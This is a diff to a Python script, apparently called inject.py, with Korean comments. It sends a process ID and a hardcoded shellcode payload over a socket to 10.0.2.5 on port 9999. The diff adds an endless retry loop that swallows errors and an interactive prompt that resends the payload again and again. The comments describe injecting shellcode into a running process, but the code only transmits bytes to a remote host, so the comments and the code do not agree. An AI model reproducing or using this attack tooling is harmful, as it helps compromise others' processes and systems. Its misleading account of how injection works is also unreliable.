@@ -38,20 +38,37 @@ shellcode = (
     "\xe7"
 )
 
+# 쉘코드를 실행 중인 프로세스에 삽입하는 함수
 def inject_shellcode(pid):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(('10.0.2.5', 9999))
+    while True:
+        try:
+            # 프로세스 메모리에 접근할 수 있는 권한을 가진 통신 소켓 생성
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect(('10.0.2.5', 9999))  # 삽입할 쉘코드가 실행 중인 서버 주소와 포트
 
-    s.send(str(pid))
+            # 프로세스 ID를 전송
+            s.send(str(pid))
 
-    s.send(shellcode)
+            # 쉘코드를 전송
+            s.send(shellcode)
 
-    s.close()
+            # 연결 종료
+            s.close()
+        except Exception as e:
+            print("Error:", e)
+            pass
 
 if __name__ == "__main__":
+    # 명령줄 인수로부터 실행 중인 프로세스의 PID 입력 받기
     if len(sys.argv) != 2:
         print("Usage: python inject.py <PID>")
         sys.exit(1)
 
     pid = sys.argv[1]
-    inject_shellcode(pid)
+
+    # 쉘코드 삽입
+    while True:
+        command = input("Enter 'exit' to quit: ")
+        if command.strip() == 'exit':
+            break
+        inject_shellcode(pid)
